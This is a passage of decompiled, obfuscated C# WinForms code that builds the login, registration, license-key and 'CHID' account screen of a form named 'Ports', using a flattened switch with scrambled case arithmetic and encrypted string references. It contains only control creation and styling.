      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -((-(-567663301 * -2063572316) - (-(num2 * 1286518173) ^ -(820115561 * (-1222757703 - 278661602)))) * -2001620471)) % 356U)
        {
          case 0:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num3 * 911394746 ^ 769274677;
            continue;
          case 1:
            ((Ports) this).CHIDbtn.Text = EXGuarder.\u003622B386F;
            num1 = (int) num3 * 99665269 ^ 1829928281;
            continue;
          case 2:
            ((Ports) this).pnl0.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num3 * -1689747656 ^ 1670933828;
            continue;
          case 3:
            ((Ports) this).usremailtextreg.StyleCustomMode = true;
            num1 = (int) num3 * -1206640563 ^ 1405221515;
            continue;
          case 4:
            ((Ports) this).usrkeyreg.Font = new Font(EXGuarder.\u0031935320A, 12f);
            num1 = (int) num3 * -513766091 ^ -364273802;
            continue;
          case 5:
            ((Ports) this).DrakeUILinkLabel1.VisitedLinkColor = Color.FromArgb(230, 80, 80);
            ((Ports) this).policylink.ActiveLinkColor = Color.FromArgb(220, 155, 40);
            num1 = (int) num3 * -1512785743 ^ -989269868;
            continue;
          case 6:
            ((Ports) this).savekey.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1169992510 ^ -1390488913;
            continue;
          case 7:
            ((Ports) this).Panel1.ResumeLayout(false);
            num1 = (int) num3 * 1686806454 ^ 1399388990;
            continue;
          case 8:
            ((Ports) this).DrakeUILinkLabel1.Text = EXGuarder.\u003666F6C42;
            num1 = (int) num3 * 1888749089 ^ -211569229;
            continue;
          case 9:
            ((Ports) this).loginbtn.Style = UIStyle.Custom;
            ((Ports) this).loginbtn.SymbolSize = 0;
            num1 = (int) num3 * -1917256491 ^ 990250455;
            continue;
          case 10:
            ((Ports) this).Label1.Font = new Font(EXGuarder.\u0031935320A, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            ((Ports) this).Label1.ForeColor = Color.White;
            num1 = (int) num3 * -597879813 ^ -30614500;
            continue;
          case 11:
            ((Ports) this).DrakeUILoadingBar1.BackColor = Color.Transparent;
            ((Ports) this).DrakeUILoadingBar1.Font = new Font(EXGuarder.\u0031935320A, 12f);
            num1 = (int) num3 * 1736382334 ^ 1798241859;
            continue;
          case 12:
            goto label_1;
          case 13:
            ((Ports) this).CHIDimg.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 499923914 ^ -619919874;
            continue;
          case 14:
            ((Ports) this).CHIDbtn.SymbolSize = 0;
            ((Ports) this).CHIDbtn.TabIndex = 73;
            num1 = (int) num3 * 1909745701 ^ -1065659258;
            continue;
          case 15:
            ((Ports) this).TabPage2.TabIndex = 1;
            num1 = (int) num3 * -1321570726 ^ -849790996;
            continue;
          case 16:
            ((Ports) this).TabPage2.Controls.Add((Control) ((Ports) this).loadingimage);
            num1 = (int) num3 * 1922007021 ^ -749072252;
            continue;
          case 17:
            ((Ports) this).TabPage1.Controls.Add((Control) ((Ports) this).keyText);
            ((Ports) this).TabPage1.Controls.Add((Control) ((Ports) this).DrakeUILoadingBar1);
            ((Ports) this).TabPage1.Controls.Add((Control) ((Ports) this).regbtn);
            num1 = (int) num3 * 791912410 ^ 998388889;
            continue;
          case 18:
            ((Ports) this).Label2.ForeColor = Color.White;
            num1 = (int) num3 * -1584049911 ^ -1844563385;
            continue;
          case 19:
            ((Ports) this).Panel1.Controls.Add((Control) ((Ports) this).DrakeUILinkLabel1);
            num1 = (int) num3 * 288622368 ^ 211458204;
            continue;
          case 20:
            ((Ports) this).usremailtextreg.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1958209791 ^ -1101398990;
            continue;
          case 21:
            ((Ports) this).savekey.Size = new Size(303, 22);
            ((Ports) this).savekey.Style = UIStyle.Custom;
            ((Ports) this).savekey.TabIndex = 61;
            ((Ports) this).savekey.Text = EXGuarder.\u00339205846;
            num1 = (int) num3 * 549838553 ^ 1591282268;
            continue;
          case 22:
            ((Ports) this).loginbtn.ForePressColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * 1768328905 ^ 874059293;
            continue;
          case 23:
            ((Ports) this).DrakeUILoadingBar1.Text = EXGuarder.\u00377331A46;
            num1 = (int) num3 * 771752258 ^ -262946501;
            continue;
          case 24:
            ((Ports) this).pnl1.Controls.Add((Control) ((Ports) this).Label3);
            num1 = (int) num3 * -1093614985 ^ 764741873;
            continue;
          case 25:
            ((Ports) this).CHIDaccount.Size = new Size(303, 27);
            ((Ports) this).CHIDaccount.Style = UIStyle.Custom;
            num1 = (int) num3 * -147669307 ^ -740745685;
            continue;
          case 26:
            ((Ports) this).keyText.Cursor = Cursors.IBeam;
            num1 = (int) num3 * -2083209250 ^ 1966614392;
            continue;
          case 27:
            ((Ports) this).exitbtn = new DrakeUIButtonIcon();
            ((Ports) this).PictureBox1 = new PictureBox();
            num1 = (int) num3 * -903154425 ^ 1695342273;
            continue;
          case 28:
            ((Ports) this).loginlabel.BackColor = Color.FromArgb(18, 11, 13);
            ((Ports) this).loginlabel.Dock = DockStyle.Top;
            ((Ports) this).loginlabel.Font = new Font(EXGuarder.\u0031935320A, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 2132079820 ^ -699033409;
            continue;
          case 29:
            ((Ports) this).regbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -1337055208 ^ 216747619;
            continue;
          case 30:
            ((Ports) this).loadingimageR.Text = EXGuarder.\u00377331A46;
            ((Ports) this).loadingimageR.Visible = false;
            num1 = (int) num3 * -901204095 ^ 2051271115;
            continue;
          case 31:
            ((Ports) this).TabPage2.Text = EXGuarder.\u00316160F50;
            ((Ports) this).loadingimage.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            ((Ports) this).loadingimage.BackColor = Color.Transparent;
            num1 = (int) num3 * 388805498 ^ -1689935449;
            continue;
          case 32:
            ((Ports) this).loginbtn.Location = new Point(98, 167);
            ((Ports) this).loginbtn.Name = EXGuarder.\u00329310672;
            ((Ports) this).loginbtn.Radius = 10;
            ((Ports) this).loginbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Ports) this).loginbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -1527209048 ^ 1715088308;
            continue;
          case 33:
            ((Ports) this).usrkeytext.Font = new Font(EXGuarder.\u0031935320A, 12f);
            ((Ports) this).usrkeytext.ForeColor = Color.White;
            ((Ports) this).usrkeytext.Location = new Point(4, 95);
            num1 = (int) num3 * -1218602497 ^ -954635840;
            continue;
          case 34:
            ((Ports) this).usrkeyreg.Margin = new Padding(4);
            num1 = (int) num3 * 1877245479 ^ -1773200238;
            continue;
          case 35:
            ((Ports) this).Panel1.Controls.Add((Control) ((Ports) this).DrakeUITabControl1);
            ((Ports) this).Panel1.Controls.Add((Control) ((Ports) this).qutelabel);
            num1 = (int) num3 * -515080346 ^ 1240627499;
            continue;
          case 36:
            ((Ports) this).Label13.Size = new Size(423, 35);
            num1 = (int) num3 * 1256110787 ^ 1654098014;
            continue;
          case 37:
            ((Ports) this).pnl1.TabIndex = 5;
            num1 = (int) num3 * -1316581809 ^ -1479302396;
            continue;
          case 38:
            ((Ports) this).loadingimage.Font = new Font(EXGuarder.\u0031935320A, 12f);
            num1 = (int) num3 * -847606859 ^ 321382930;
            continue;
          case 39:
            ((Ports) this).CHIDimg.Size = new Size(23, 24);
            num1 = (int) num3 * -1056788749 ^ -914056152;
            continue;
          case 40:
            ((Ports) this).exitbtn.Radius = 10;
            ((Ports) this).exitbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1242166866 ^ -1156097063;
            continue;
          case 41:
            ((Ports) this).TabPage3.BackColor = Color.FromArgb(18, 11, 13);
            num1 = (int) num3 * -1488406578 ^ -2003455497;
            continue;
          case 42:
            ((Ports) this).TabPage1.Text = EXGuarder.\u003474D5D2E;
            ((Ports) this).loadingimageR.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            ((Ports) this).loadingimageR.BackColor = Color.Transparent;
            num1 = (int) num3 * 1938472787 ^ -520335536;
            continue;
          case 43:
            ((Ports) this).Label13.Text = EXGuarder.\u0032A2B2F78;
            ((Ports) this).Label13.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * 1637629698 ^ -1004931155;
            continue;
          case 44:
            ((Ports) this).TabPage2.Location = new Point(0, 40);
            ((Ports) this).TabPage2.Name = EXGuarder.\u0032C036836;
            ((Ports) this).TabPage2.Size = new Size(309, 203);
            num1 = (int) num3 * 930638650 ^ 1297004058;
            continue;
          case 45:
            ((Ports) this).exitbtn.FillColor = Color.Transparent;
            num1 = (int) num3 * 999705940 ^ -1649248811;
            continue;
          case 46:
            ((Ports) this).usrkeyreg.FillColor = Color.Black;
            num1 = (int) num3 * 356303498 ^ 1471802539;
            continue;
          case 47:
            ((Ports) this).exitbtn.SymbolSize = 25;
            num1 = (int) num3 * 1377922715 ^ 440104943;
            continue;
          case 48:
            ((Ports) this).usrkeytext = new DrakeUITextBox();
            num1 = (int) num3 * -1895618684 ^ -1362043947;
            continue;
          case 49:
            ((Ports) this).loginbtn.ForeColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * -302329348 ^ -1441721539;
            continue;
          case 50:
            ((Ports) this).TabPage2.SuspendLayout();
            ((Ports) this).TabPage1.SuspendLayout();
            num1 = (int) num3 * 823889653 ^ -170015594;
            continue;
          case 51:
            ((Ports) this).keyText.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * -347016178 ^ -1223983344;
            continue;
          case 52:
            ((Ports) this).usrkeytext.FillColor = Color.Black;
            num1 = (int) num3 * 626659057 ^ 1816498968;
            continue;
          case 53:
            ((Ports) this).exitbtn.Name = EXGuarder.\u0034F024754;
            num1 = (int) num3 * 760600158 ^ 458328601;
            continue;
          case 54:
            ((Ports) this).welclabel.Text = EXGuarder.\u003551C0133;
            ((Ports) this).welclabel.TextAlign = ContentAlignment.BottomCenter;
            num1 = (int) num3 * 478620733 ^ -308691603;
            continue;
          case 55:
            ((Ports) this).TabPage1.Size = new Size(309, 203);
            ((Ports) this).TabPage1.TabIndex = 2;
            num1 = (int) num3 * -555229222 ^ -1297626289;
            continue;
          case 56:
            ((Ports) this).usremailtext.Style = UIStyle.Custom;
            ((Ports) this).usremailtext.StyleCustomMode = true;
            num1 = (int) num3 * -1724556143 ^ -982692601;
            continue;
          case 57:
            ((Ports) this).CHIDimg.BackColor = Color.Transparent;
            num1 = (int) num3 * 70107061 ^ 2063408096;
            continue;
          case 58:
            ((Ports) this).keyText.Style = UIStyle.Custom;
            ((Ports) this).keyText.StyleCustomMode = true;
            num1 = (int) num3 * 481029963 ^ 528429137;
            continue;
          case 59:
            ((Ports) this).usrkeyreg.ForeColor = Color.White;
            ((Ports) this).usrkeyreg.Location = new Point(4, 95);
            num1 = (int) num3 * 970048540 ^ -153702095;
            continue;
          case 60:
            ((Ports) this).loginbtn.Text = EXGuarder.\u003622B386F;
            num1 = (int) num3 * 390458074 ^ 1565375201;
            continue;
          case 61:
            ((Ports) this).loginbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            ((Ports) this).loginbtn.FillPressColor = Color.Black;
            num1 = (int) num3 * 746697432 ^ 668089632;
            continue;
          case 62:
            ((Ports) this).CHIDimg.Font = new Font(EXGuarder.\u0031935320A, 12f);
            num1 = (int) num3 * 348378676 ^ -1314640476;
            continue;
          case 63:
            ((Ports) this).loadingimageR.Font = new Font(EXGuarder.\u0031935320A, 12f);
            num1 = (int) num3 * 572309368 ^ -566270293;
            continue;
          case 64:
            ((Ports) this).usremailtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Ports) this).usremailtext.Size = new Size(303, 27);
            num1 = (int) num3 * -671429277 ^ 1155407179;
            continue;
          case 65:
            ((Ports) this).loginbtn.FillColor = Color.Transparent;
            num1 = (int) num3 * -1718916261 ^ -1443644157;
            continue;
          case 66:
            ((Ports) this).CHIDpassword.Watermark = EXGuarder.\u003416D0F3C;
            ((Ports) this).CHIDaccount.Cursor = Cursors.IBeam;
            ((Ports) this).CHIDaccount.FillColor = Color.Black;
            num1 = (int) num3 * -1055407742 ^ 2112263601;
            continue;
          case 67:
            ((Ports) this).notpass.Visible = true;
            num1 = (int) num3 * -123014157 ^ 946523052;
            continue;
          case 68:
            ((Ports) this).Label1.Dock = DockStyle.Top;
            num1 = (int) num3 * -155209827 ^ 624188869;
            continue;
          case 69:
            ((Ports) this).statuslabel.Visible = false;
            num1 = (int) num3 * -96718852 ^ -207887412;
            continue;
          case 70:
            ((Ports) this).DrakeUILoadingBar1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -2065886975 ^ 153230580;
            continue;
          case 71:
            ((Ports) this).Label3.Location = new Point(3, 467);
            ((Ports) this).Label3.Name = EXGuarder.\u003763B5B27;
            num1 = (int) num3 * -2133616539 ^ 2056321924;
            continue;
          case 72:
            ((Ports) this).DrakeUILinkLabel1 = new DrakeUILinkLabel();
            ((Ports) this).policylink = new DrakeUILinkLabel();
            num1 = (int) num3 * 509192217 ^ -1424229114;
            continue;
          case 73:
            ((Ports) this).statuslabel.ForeColor = Color.Lime;
            num1 = (int) num3 * -1944217832 ^ -1656055040;
            continue;
          case 74:
            ((Ports) this).CHIDimg = new DrakeUILoadingBar();
            ((Ports) this).CHIDbtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * -1080998930 ^ -1922218657;
            continue;
          case 75:
            ((Ports) this).CHIDaccount.StyleCustomMode = true;
            num1 = (int) num3 * 733316165 ^ 388138545;
            continue;
          case 76:
            this.FormBorderStyle = FormBorderStyle.None;
            num1 = (int) num3 * 856676925 ^ 1152870301;
            continue;
          case 77:
            ((Ports) this).loadingimage.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Ports) this).loadingimage.Location = new Point(221, 167);
            ((Ports) this).loadingimage.Name = EXGuarder.\u0030E5E266A;
            num1 = (int) num3 * -508351810 ^ 1718745379;
            continue;
          case 78:
            ((Ports) this).Label2.TabIndex = 70;
            ((Ports) this).Label2.Text = EXGuarder.\u0030F0D036A;
            num1 = (int) num3 * -1359104065 ^ -713830026;
            continue;
          case 79:
            ((Ports) this).regbtn.Size = new Size(117, 24);
            num1 = (int) num3 * -820797663 ^ 870028638;
            continue;
          case 80:
            ((Ports) this).CHIDaccount.Margin = new Padding(4);
            ((Ports) this).CHIDaccount.Maximum = (double) int.MaxValue;
            ((Ports) this).CHIDaccount.Minimum = (double) int.MinValue;
            ((Ports) this).CHIDaccount.Name = EXGuarder.\u003341C620F;
            ((Ports) this).CHIDaccount.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * 394172078 ^ 824444478;
            continue;
          case 81:
            ((Ports) this).CHIDaccount.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1084012065 ^ -1021378483;
            continue;
          case 82:
            ((Ports) this).TabPage3.Text = EXGuarder.\u0034643283C;
            num1 = (int) num3 * 1496837228 ^ -597655812;
            continue;
          case 83:
            ((Ports) this).welclabel.Margin = new Padding(2, 0, 2, 0);
            num1 = (int) num3 * 48900900 ^ -2079164792;
            continue;
          case 84:
            ((Ports) this).CHIDpassword = new DrakeUITextBox();
            ((Ports) this).CHIDaccount = new DrakeUITextBox();
            num1 = (int) num3 * -474612925 ^ 1347496563;
            continue;
          case 85:
            ((Ports) this).keyText.Location = new Point(4, 130);
            num1 = (int) num3 * 1276908684 ^ 2017716130;
            continue;
          case 86:
            goto label_3;
          case 87:
            ((Ports) this).keyText.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1842220418 ^ 1482790771;
            continue;
          case 88:
            ((Ports) this).pnl1.BackgroundImageLayout = ImageLayout.Stretch;
            ((Ports) this).pnl1.Controls.Add((Control) ((Ports) this).exitbtn);
            ((Ports) this).pnl1.Controls.Add((Control) ((Ports) this).PictureBox1);
            num1 = (int) num3 * 862320937 ^ -700973996;
            continue;
          case 89:
            ((Ports) this).TabPage2.Controls.Add((Control) ((Ports) this).loginlabel);
            num1 = (int) num3 * 607280669 ^ 271287918;
            continue;
          case 90:
            ((Ports) this).TabPage1.Controls.Add((Control) ((Ports) this).usremailtextreg);
            num1 = (int) num3 * 1687794634 ^ -1905979766;
            continue;
          case 91:
            ((Ports) this).CHIDbtn.Radius = 10;
            num1 = (int) num3 * -1018324785 ^ -252585821;
            continue;
          case 92:
            ((Ports) this).DrakeUILinkLabel1.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * 2007862359 ^ -1361120112;
            continue;
          case 93:
            ((Ports) this).usremailtext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -168370865 ^ -1924575928;
            continue;
          case 94:
            ((Ports) this).loginbtn.BackColor = Color.Transparent;
            ((Ports) this).loginbtn.Cursor = Cursors.Hand;
            ((Ports) this).loginbtn.Enabled = false;
            num1 = (int) num3 * -1168132053 ^ 1401457670;
            continue;
          case 95:
            ((Ports) this).savekey = new DrakeUICheckBox();
            num1 = (int) num3 * -747494517 ^ -27404415;
            continue;
          case 96:
            ((Ports) this).DrakeUILinkLabel1.Style = UIStyle.Custom;
            num1 = (int) num3 * 2024203391 ^ 913035215;
            continue;
          case 97:
            ((Ports) this).usrkeytext.PasswordChar = '•';
            ((Ports) this).usrkeytext.Radius = 10;
            num1 = (int) num3 * -1819255285 ^ -430421628;
            continue;
          case 98:
            ((Ports) this).policylink.Style = UIStyle.Custom;
            ((Ports) this).policylink.TabIndex = 34;
            num1 = (int) num3 * -1276472702 ^ -1232513430;
            continue;
          case 99:
            ((Ports) this).regbtn.ForeColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * -2146561671 ^ 100037969;
            continue;
          case 100:
            ((Ports) this).statuslabel.Font = new Font(EXGuarder.\u003721C5775, 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 250680835 ^ -1164909940;
            continue;
          case 101:
            ((Ports) this).pnl1.Size = new Size(991, 484);
            num1 = (int) num3 * 1969262799 ^ -505680517;
            continue;
          case 102:
            ((Ports) this).changeIDWorker = new BackgroundWorker();
            ((Ports) this).pnl1.SuspendLayout();
            num1 = (int) num3 * 1975856106 ^ -425336910;
            continue;
          case 103:
            ((Ports) this).CHIDaccount.Radius = 10;
            ((Ports) this).CHIDaccount.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1720944472 ^ 1810737312;
            continue;
          case 104:
            ((Ports) this).keyText.Maximum = (double) int.MaxValue;
            ((Ports) this).keyText.Minimum = (double) int.MinValue;
            ((Ports) this).keyText.Name = EXGuarder.\u003325D1351;
            num1 = (int) num3 * -1596018186 ^ 872542069;
            continue;
          case 105:
            ((Ports) this).usrkeyreg.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 664784224 ^ -978363337;
            continue;
          case 106:
            ((Ports) this).regbtn = new DrakeUIButtonIcon();
            ((Ports) this).usrkeyreg = new DrakeUITextBox();
            num1 = (int) num3 * 1571606025 ^ -1832957468;
            continue;
          case 107:
            ((Ports) this).TabPage2 = new TabPage();
            num1 = (int) num3 * -984688629 ^ -301605483;
            continue;
          case 108:
            ((Ports) this).CHIDimg.TabIndex = 75;
            num1 = (int) num3 * -1341143627 ^ -1678500741;
            continue;
          case 109:
            ((Ports) this).Label13.Location = new Point(67, 173);
            num1 = (int) num3 * -1101256420 ^ 781728713;
            continue;
          case 110:
            ((Ports) this).regbtn.Enabled = false;
            ((Ports) this).regbtn.FillColor = Color.Transparent;
            num1 = (int) num3 * -644674996 ^ 1797435497;
            continue;
          case 111:
            ((Ports) this).pnl1.ForeColor = Color.White;
            ((Ports) this).pnl1.Location = new Point(0, 0);
            ((Ports) this).pnl1.Name = EXGuarder.\u0034B05601E;
            num1 = (int) num3 * 30331830 ^ 1045230290;
            continue;
          case 112:
            ((Ports) this).qutelabel.Font = new Font(EXGuarder.\u0031935320A, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 2058764793 ^ 1244937115;
            continue;
          case 113:
            ((Ports) this).exitbtn.Location = new Point(952, 10);
            num1 = (int) num3 * 963688243 ^ 1141857823;
            continue;
          case 114:
            ((Ports) this).DrakeUITabControl1.SuspendLayout();
            num1 = (int) num3 * 1840229811 ^ 1085285371;
            continue;
          case 115:
            ((Ports) this).Panel1.Dock = DockStyle.Left;
            ((Ports) this).Panel1.Location = new Point(0, 0);
            num1 = (int) num3 * -913030753 ^ -1413715951;
            continue;
          case 116:
            ((Ports) this).policylink.Name = EXGuarder.\u0033C39544D;
            ((Ports) this).policylink.Size = new Size(320, 29);
            num1 = (int) num3 * -552740710 ^ -277601203;
            continue;
          case 117:
            ((Ports) this).CHIDimg.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            num1 = (int) num3 * -985756330 ^ -22955626;
            continue;
          case 118:
            ((Ports) this).exitbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * 1942316394 ^ -757405602;
            continue;
          case 119:
            ((Ports) this).loginbtn.TabIndex = 60;
            num1 = (int) num3 * -1524957498 ^ -1978723879;
            continue;
          case 120:
            ((Ports) this).usremailtextreg.Cursor = Cursors.IBeam;
            num1 = (int) num3 * 1959150410 ^ 253781475;
            continue;
          case 121:
            ((Ports) this).CHIDbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            ((Ports) this).CHIDbtn.FillPressColor = Color.Black;
            ((Ports) this).CHIDbtn.FillSelectedColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * -1766936261 ^ 1232460781;
            continue;
          case 122:
            ((Ports) this).usrkeytext.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 49843883 ^ -1371817071;
            continue;
          case 123:
            ((Ports) this).pnl0.ResumeLayout(false);
            num1 = (int) num3 * -427616983 ^ -1167464036;
            continue;
          case 124:
            ((Ports) this).TabPage3.Size = new Size(309, 203);
            ((Ports) this).TabPage3.TabIndex = 3;
            num1 = (int) num3 * -823679361 ^ 732146345;
            continue;
          case 125:
            ((Ports) this).CHIDbtn.Location = new Point(98, 167);
            num1 = (int) num3 * 1963630651 ^ 9454034;
            continue;
          case 126:
            this.BackColor = SystemColors.Control;
            this.ClientSize = new Size(991, 484);
            num1 = (int) num3 * -1130551221 ^ 2032548371;
            continue;
          case (uint) sbyte.MaxValue:
            ((Ports) this).exitbtn.TabIndex = 48;
            num1 = (int) num3 * -1232106399 ^ 521045313;
            continue;
          case 128:
            ((Ports) this).loginlabel.Text = EXGuarder.\u003775E0942;
            ((Ports) this).loginlabel.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * 1118276932 ^ -371704061;
            continue;
          case 129:
            ((Ports) this).loadingimage.TabIndex = 62;
            ((Ports) this).loadingimage.Text = EXGuarder.\u00377331A46;
            ((Ports) this).loadingimage.Visible = false;
            num1 = (int) num3 * 633874342 ^ 304223625;
            continue;
          case 130:
            this.Name = EXGuarder.\u003154A6F11;
            this.StartPosition = FormStartPosition.CenterScreen;
            num1 = (int) num3 * 810874989 ^ 1280466971;
            continue;
          case 131:
            ((Ports) this).loadingimageR.Name = EXGuarder.\u003454E222A;
            num1 = (int) num3 * 1173742884 ^ -962520902;
            continue;
          case 132:
            ((Ports) this).CHIDbtn.RectSelectedColor = Color.White;
            ((Ports) this).CHIDbtn.Size = new Size(117, 24);
            ((Ports) this).CHIDbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * 844634274 ^ -2000239435;
            continue;
          case 133:
            ((Ports) this).Label1 = new Label();
            num1 = (int) num3 * -1840270338 ^ 1213349629;
            continue;
          case 134:
            ((Ports) this).CHIDpassword.FillColor = Color.Black;
            ((Ports) this).CHIDpassword.Font = new Font(EXGuarder.\u0031935320A, 12f);
            ((Ports) this).CHIDpassword.ForeColor = Color.White;
            num1 = (int) num3 * -2027541583 ^ -1147374294;
            continue;
          case 135:
            ((Ports) this).regbtn.ForePressColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * -498139591 ^ 532438747;
            continue;
          case 136:
            ((Ports) this).TabPage1.BackColor = Color.FromArgb(18, 11, 13);
            ((Ports) this).TabPage1.Controls.Add((Control) ((Ports) this).loadingimageR);
            num1 = (int) num3 * -1918312065 ^ -1075388236;
            continue;
          case 137:
            ((Ports) this).loginbtn.Font = new Font(EXGuarder.\u0031935320A, 10.5f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 900627018 ^ 69923990;
            continue;
          case 138:
            this.Controls.Add((Control) ((Ports) this).pnl0);
            num1 = (int) num3 * 875651563 ^ 184566633;
            continue;
          case 139:
            ((Ports) this).exitbtn.RectHoverColor = Color.White;
            num1 = (int) num3 * 1862926383 ^ -1698273444;
            continue;
          case 140:
            ((Ports) this).welclabel.TabIndex = 3;
            num1 = (int) num3 * -538711130 ^ -1762782207;
            continue;
          case 141:
            ((Ports) this).Label3.AutoSize = true;
            ((Ports) this).Label3.BackColor = Color.FromArgb(237, 28, 36);
            ((Ports) this).Label3.Font = new Font(EXGuarder.\u003721C5775, 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            ((Ports) this).Label3.ForeColor = Color.FromArgb(64, 64, 64);
            num1 = (int) num3 * -203955995 ^ -1397232713;
            continue;
          case 142:
            ((Ports) this).DrakeUIToolTip1.BackColor = Color.FromArgb(54, 54, 54);
            num1 = (int) num3 * -789291809 ^ 578702202;
            continue;
          case 143:
            ((Ports) this).statuslabel.Name = EXGuarder.\u0033F5D4766;
            ((Ports) this).statuslabel.Size = new Size(991, 8);
            num1 = (int) num3 * -1044747333 ^ -1217661656;
            continue;
          case 144:
            ((Ports) this).usremailtextreg.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * -1343426753 ^ -2125143939;
            continue;
          case 145:
            ((Ports) this).Panel1.Margin = new Padding(2);
            num1 = (int) num3 * -1995677632 ^ -1985459923;
            continue;
          case 146:
            ((Ports) this).Panel1.Name = EXGuarder.\u003082D2241;
            ((Ports) this).Panel1.Size = new Size(320, 476);
            ((Ports) this).Panel1.TabIndex = 50;
            num1 = (int) num3 * -1045638917 ^ 1603487459;
            continue;
          case 147:
            ((Ports) this).usremailtextreg = new DrakeUITextBox();
            num1 = (int) num3 * -318866584 ^ -1595194444;
            continue;
          case 148:
            ((Ports) this).TabPage1.Controls.Add((Control) ((Ports) this).usrkeyreg);
            num1 = (int) num3 * 1073148727 ^ -1978713123;
            continue;
          case 149:
            ((Ports) this).loginbtn.FillSelectedColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * 1615144503 ^ 1922546327;
            continue;
          case 150:
            ((Ports) this).usrkeytext.Cursor = Cursors.IBeam;
            num1 = (int) num3 * -2139584780 ^ -1043030513;
            continue;
          case 151:
            ((Ports) this).DrakeUITabControl1 = new DrakeUITabControl();
            num1 = (int) num3 * 1592480809 ^ 15839117;
            continue;
          case 152:
            ((Ports) this).DrakeUILinkLabel1.LinkBehavior = LinkBehavior.NeverUnderline;
            ((Ports) this).DrakeUILinkLabel1.LinkColor = Color.FromArgb(30, 136, 229);
            ((Ports) this).DrakeUILinkLabel1.Location = new Point(0, 418);
            num1 = (int) num3 * 850084963 ^ 813692670;
            continue;
          case 153:
            ((Ports) this).pnl0.Dock = DockStyle.Fill;
            num1 = (int) num3 * 705479544 ^ -1920285607;
            continue;
          case 154:
            ((Ports) this).TabPage2.ResumeLayout(false);
            ((Ports) this).TabPage1.ResumeLayout(false);
            ((Ports) this).TabPage3.ResumeLayout(false);
            ((ISupportInitialize) ((Ports) this).PictureBox2).EndInit();
            num1 = (int) num3 * 139944339 ^ 1533878016;
            continue;
          case 155:
            ((Ports) this).usrkeyreg.Size = new Size(303, 27);
            num1 = (int) num3 * 1080473966 ^ -1437056811;
            continue;
          case 156:
            ((Ports) this).CHIDimg.Text = EXGuarder.\u00377331A46;
            num1 = (int) num3 * -46516798 ^ 1730612456;
            continue;
          case 157:
            ((Ports) this).TabPage2.Controls.Add((Control) ((Ports) this).usremailtext);
            num1 = (int) num3 * -1046533736 ^ 1850613740;
            continue;
          case 158:
            ((Ports) this).PictureBox1.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u00346787141);
            ((Ports) this).PictureBox1.Location = new Point(320, 0);
            num1 = (int) num3 * -451501462 ^ -493263450;
            continue;
          case 159:
            ((Ports) this).regbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -320646063 ^ 555327083;
            continue;
          case 160:
            ((Ports) this).qutelabel.ForeColor = SystemColors.WindowFrame;
            num1 = (int) num3 * 983591840 ^ 1587131523;
            continue;
          case 161:
            ((Ports) this).pnl1.Controls.Add((Control) ((Ports) this).Panel1);
            num1 = (int) num3 * -857755380 ^ 1985165128;
            continue;
          case 162:
            ((Ports) this).keyText.Font = new Font(EXGuarder.\u0031935320A, 12f);
            ((Ports) this).keyText.ForeColor = Color.White;
            num1 = (int) num3 * 1017055871 ^ 348665798;
            continue;
          case 163:
            ((Ports) this).DrakeUILinkLabel1.ActiveLinkColor = Color.FromArgb(220, 155, 40);
            ((Ports) this).DrakeUILinkLabel1.BackColor = Color.Transparent;
            ((Ports) this).DrakeUILinkLabel1.Dock = DockStyle.Bottom;
            num1 = (int) num3 * 1196801798 ^ -9156127;
            continue;
          case 164:
            ((Ports) this).TabPage3 = new TabPage();
